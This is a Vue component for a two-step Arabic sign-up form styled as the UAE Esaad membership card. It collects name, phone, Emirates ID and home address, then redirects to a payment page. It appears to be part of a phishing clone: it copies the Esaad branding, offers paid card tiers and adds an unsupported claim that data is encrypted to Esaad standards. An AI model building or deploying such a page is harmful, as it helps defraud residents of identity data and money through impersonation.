<script setup lang="ts">
import { ref } from 'vue';
import { ChevronDown, Calendar, ArrowRight, ShieldCheck } from 'lucide-vue-next';
import { useRouter } from 'vue-router';
import { createCardRequest } from '../api';

const router = useRouter();
const currentStep = ref<1 | 2>(1);

const formData = ref({
  name: '',
  mobile: '',
  idNumber: '',
  cardType: 'البلاتينية',
  emirate: 'الشارقة',
  area: '',
  street: '',
  date: '20/11/2026'
});

const isSubmitting = ref(false);

const errors = ref({
  name: '',
  mobile: '',
  idNumber: '',
  cardType: '',
  emirate: '',
  area: '',
  street: ''
});

const emirates = [
  'أبوظبي',
  'دبي',
  'الشارقة',
  'عجمان',
  'أم القيوين',
  'رأس الخيمة',
  'الفجيرة'
];

const validateStep1 = () => {
  let isValid = true;
  errors.value.name = '';
  errors.value.mobile = '';
  errors.value.idNumber = '';
  errors.value.cardType = '';

  if (!formData.value.name.trim()) {
    errors.value.name = 'الاسم مطلوب';
    isValid = false;
  }

  if (!formData.value.mobile.trim() || !/^[0-9+\-\s]{7,15}$/.test(formData.value.mobile)) {
    errors.value.mobile = 'رقم الهاتف غير صالح';
    isValid = false;
  }

  if (!formData.value.idNumber.trim()) {
    errors.value.idNumber = 'رقم الهوية مطلوب';
    isValid = false;
  }

  if (!formData.value.cardType) {
    errors.value.cardType = 'يرجى اختيار نوع البطاقة';
    isValid = false;
  }

  return isValid;
};

const validateStep2 = () => {
  let isValid = true;
  errors.value.emirate = '';
  errors.value.area = '';
  errors.value.street = '';

  if (!formData.value.emirate) {
    errors.value.emirate = 'يرجى اختيار الإمارة';
    isValid = false;
  }

  if (!formData.value.area.trim()) {
    errors.value.area = 'المنطقة مطلوبة';
    isValid = false;
  }

  if (!formData.value.street.trim()) {
    errors.value.street = 'العنوان التفصيلي مطلوب';
    isValid = false;
  }

  return isValid;
};

const goToStep2 = () => {
  if (validateStep1()) {
    currentStep.value = 2;
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }
};

const submitForm = async () => {
  if (isSubmitting.value) return;
  if (!validateStep2()) return;

  isSubmitting.value = true;
  try {
    const fullAddress = [
      formData.value.emirate,
      formData.value.area.trim(),
      formData.value.street.trim()
    ]
      .filter(Boolean)
      .join(', ');

    await createCardRequest({
      name: formData.value.name.trim(),
      mobile: formData.value.mobile.trim(),
      idNumber: formData.value.idNumber.trim(),
      cardType: formData.value.cardType,
      address: fullAddress,
      date: formData.value.date
    });
    router.push('/payment');
  } catch (error) {
    console.error('Error creating card request:', error);
  } finally {
    isSubmitting.value = false;
  }
};

const goHome = () => {
  router.push('/');
};
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto bg-[#eef5f0] min-h-screen flex flex-col font-sans text-gray-900 relative overflow-hidden">
    <!-- Top Green/Dark Esaad Header -->
    <header class="w-full bg-[#040c06] px-4 py-3 flex items-center justify-between border-b border-[#009a44]/30 relative z-20">
      <button
        @click="goHome"
        aria-label="العودة"
        class="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-colors cursor-pointer"
      >
        <ArrowRight class="w-4 h-4" />
      </button>

      <!-- Esaad Logo -->
      <div @click="goHome" class="cursor-pointer flex flex-col items-center select-none">
        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
          <circle cx="14" cy="4" r="2" fill="#39b54a" />
          <circle cx="46" cy="4" r="2" fill="#39b54a" />
          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
        </svg>
      </div>

      <div class="w-8"></div>
    </header>

    <div class="flex-1 flex flex-col items-center pt-6 px-4 pb-8">
      <!-- Top Title: كن عضواً -->
      <h1 class="text-[26px] font-extrabold text-[#008a40] text-center mb-5 tracking-tight">
        كن عضواً
      </h1>

      <!-- 3-Step Indicator (Green Esaad Style) -->
      <div class="w-full max-w-[360px] mx-auto flex items-start justify-between mb-6 px-2">
        <!-- Step 1 -->
        <button
          type="button"
          @click="currentStep = 1"
          class="flex flex-col items-center cursor-pointer"
        >
          <div
            class="w-10 h-10 rounded-full font-bold text-base flex items-center justify-center shadow-xs tabular-nums transition-colors"
            :class="currentStep === 1 ? 'bg-[#008a40] text-white shadow-md ring-4 ring-[#009a44]/20' : 'bg-[#009a44] text-white'"
          >
            1
          </div>
          <span
            class="text-[11.5px] mt-1.5 whitespace-nowrap transition-colors"
            :class="currentStep === 1 ? 'font-extrabold text-[#008a40]' : 'font-bold text-gray-700'"
          >
            معلومات شخصية
          </span>
        </button>

        <!-- Connector Line 1-2 -->
        <div class="flex-1 flex items-center justify-center pt-5 px-2">
          <div
            class="w-full max-w-[44px] h-[2.5px] rounded-full transition-colors"
            :class="currentStep >= 2 ? 'bg-[#009a44]' : 'bg-gray-300'"
          ></div>
        </div>

        <!-- Step 2 -->
        <button
          type="button"
          @click="goToStep2"
          class="flex flex-col items-center cursor-pointer"
        >
          <div
            class="w-10 h-10 rounded-full font-bold text-base flex items-center justify-center shadow-xs tabular-nums transition-colors"
            :class="currentStep === 2 ? 'bg-[#008a40] text-white shadow-md ring-4 ring-[#009a44]/20' : 'bg-gray-200 text-gray-500'"
          >
            2
          </div>
          <span
            class="text-[11.5px] mt-1.5 whitespace-nowrap transition-colors"
            :class="currentStep === 2 ? 'font-extrabold text-[#008a40]' : 'font-bold text-gray-600'"
          >
            معلومات العنوان
          </span>
        </button>

        <!-- Connector Line 2-3 -->
        <div class="flex-1 flex items-center justify-center pt-5 px-2">
          <div class="w-full max-w-[44px] h-[2.5px] bg-gray-300 rounded-full"></div>
        </div>

        <!-- Step 3 -->
        <div class="flex flex-col items-center">
          <div class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 font-bold text-base flex items-center justify-center shadow-xs tabular-nums">
            3
          </div>
          <span class="text-[11.5px] font-bold text-gray-600 mt-1.5 whitespace-nowrap">
            اشترك
          </span>
        </div>
      </div>

      <!-- Main Container Card -->
      <div class="w-full max-w-md bg-white rounded-2xl border border-gray-200/80 shadow-[0_4px_24px_rgba(0,0,0,0.05)] p-5">
        <!-- STEP 1: معلومات شخصية -->
        <form v-if="currentStep === 1" @submit.prevent="goToStep2" novalidate class="space-y-4 text-right">
          <h2 class="text-[18px] font-extrabold text-[#008a40] text-right mb-3">
            معلومات شخصية
          </h2>

          <!-- Name -->
          <div>
            <label class="block text-xs font-bold text-gray-700 mb-1.5">الاسم الكامل</label>
            <input
              v-model="formData.name"
              type="text"
              dir="rtl"
              placeholder="الاسم كما يظهر في الهوية"
              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
            />
            <p v-if="errors.name" class="text-red-600 text-[11px] mt-1">{{ errors.name }}</p>
          </div>

          <!-- Mobile -->
          <div>
            <label class="block text-xs font-bold text-gray-700 mb-1.5">رقم الهاتف</label>
            <input
              v-model="formData.mobile"
              type="tel"
              inputmode="numeric"
              dir="ltr"
              placeholder="05XXXXXXXX"
              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
            />
            <p v-if="errors.mobile" class="text-red-600 text-[11px] mt-1">{{ errors.mobile }}</p>
          </div>

          <!-- ID Number -->
          <div>
            <label class="block text-xs font-bold text-gray-700 mb-1.5">رقم الهوية الإماراتية</label>
            <input
              v-model="formData.idNumber"
              type="tel"
              inputmode="numeric"
              dir="ltr"
              placeholder="784-XXXX-XXXXXXX-X"
              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
            />
            <p v-if="errors.idNumber" class="text-red-600 text-[11px] mt-1">{{ errors.idNumber }}</p>
          </div>

          <!-- Card Type -->
          <div>
            <label class="block text-xs font-bold text-gray-700 mb-1.5">نوع البطاقة</label>
            <div class="relative">
              <select
                v-model="formData.cardType"
                dir="rtl"
                class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 appearance-none text-gray-900 focus:outline-none focus:border-[#009a44] bg-white transition-colors font-semibold text-sm pl-9 cursor-pointer"
              >
                <option value="البلاتينية">البلاتينية</option>
                <option value="الذهبية">الذهبية</option>
                <option value="الأساسية">الأساسية</option>
              </select>
              <div class="absolute inset-y-0 left-3 flex items-center pointer-events-none text-[#009a44]">
                <ChevronDown class="w-4 h-4" />
              </div>
            </div>
            <p v-if="errors.cardType" class="text-red-600 text-[11px] mt-1">{{ errors.cardType }}</p>
          </div>

          <div class="pt-3">
            <button
              type="submit"
              class="w-full bg-[#008a40] hover:bg-[#007335] text-white font-extrabold text-sm py-3.5 px-6 rounded-xl shadow-md transition-colors cursor-pointer"
            >
              التالي
            </button>
          </div>
        </form>

        <!-- STEP 2: معلومات العنوان -->
        <form v-else @submit.prevent="submitForm" novalidate class="space-y-4 text-right">
          <h2 class="text-[18px] font-extrabold text-[#008a40] text-right mb-3">
            معلومات العنوان
          </h2>

          <!-- Emirate -->
          <div>
            <label class="block text-xs font-bold text-gray-700 mb-1.5">الإمارة</label>
            <div class="relative">
              <select
                v-model="formData.emirate"
                dir="rtl"
                class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 appearance-none text-gray-900 focus:outline-none focus:border-[#009a44] bg-white transition-colors font-semibold text-sm pl-9 cursor-pointer"
              >
                <option v-for="em in emirates" :key="em" :value="em">{{ em }}</option>
              </select>
              <div class="absolute inset-y-0 left-3 flex items-center pointer-events-none text-[#009a44]">
                <ChevronDown class="w-4 h-4" />
              </div>
            </div>
            <p v-if="errors.emirate" class="text-red-600 text-[11px] mt-1">{{ errors.emirate }}</p>
          </div>

          <!-- Area -->
          <div>
            <label class="block text-xs font-bold text-gray-700 mb-1.5">المنطقة / الحي</label>
            <input
              v-model="formData.area"
              type="text"
              dir="rtl"
              placeholder="أدخل المنطقة أو الحي"
              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
            />
            <p v-if="errors.area" class="text-red-600 text-[11px] mt-1">{{ errors.area }}</p>
          </div>

          <!-- Detailed Street / Building -->
          <div>
            <label class="block text-xs font-bold text-gray-700 mb-1.5">العنوان التفصيلي</label>
            <input
              v-model="formData.street"
              type="text"
              dir="rtl"
              placeholder="الشارع، رقم المبنى أو الفيلا"
              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
            />
            <p v-if="errors.street" class="text-red-600 text-[11px] mt-1">{{ errors.street }}</p>
          </div>

          <!-- Delivery Date -->
          <div>
            <label class="block text-xs font-bold text-gray-700 mb-1.5">موعد الاستلام</label>
            <div class="relative">
              <input
                v-model="formData.date"
                type="text"
                dir="ltr"
                class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] text-gray-900 bg-white font-medium text-sm pl-10"
              />
              <div class="absolute inset-y-0 left-3 flex items-center pointer-events-none text-[#009a44]">
                <Calendar class="w-4 h-4" />
              </div>
            </div>
          </div>

          <div class="pt-3 flex gap-3">
            <button
              type="button"
              @click="currentStep = 1"
              class="w-1/3 bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold text-sm py-3.5 px-4 rounded-xl transition-colors cursor-pointer"
            >
              السابق
            </button>
            <button
              type="submit"
              :disabled="isSubmitting"
              class="w-2/3 flex items-center justify-center gap-2 bg-[#008a40] hover:bg-[#007335] text-white font-extrabold text-sm py-3.5 px-6 rounded-xl shadow-md transition-colors cursor-pointer disabled:opacity-70"
            >
              <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
              <span v-else>المتابعة إلى الفاتورة</span>
            </button>
          </div>
        </form>

        <!-- Trust Note -->
        <div class="mt-4 flex items-center justify-center gap-1.5 text-[11px] text-gray-500">
          <ShieldCheck class="w-3.5 h-3.5 text-[#008a40]" />
          <span>بياناتك محمية ومشفرة وفق معايير بطاقة إسعاد</span>
        </div>
      </div>
    </div>

    <!-- Esaad Footer -->
    <footer class="bg-[#e4f2ea] px-5 py-4 text-right border-t border-gray-200/60 mt-auto">
      <div class="flex items-center justify-between">
        <div class="flex flex-col items-center">
          <span class="text-[#008a40] font-black text-xs leading-none">إسعاد</span>
          <span class="text-gray-900 font-extrabold text-[10px] leading-none">esaad</span>
        </div>
        <span class="text-[11px] text-gray-600 font-medium">© 2026 esaad, كل الحقوق محفوظة.</span>
      </div>
    </footer>
  </div>
</template>
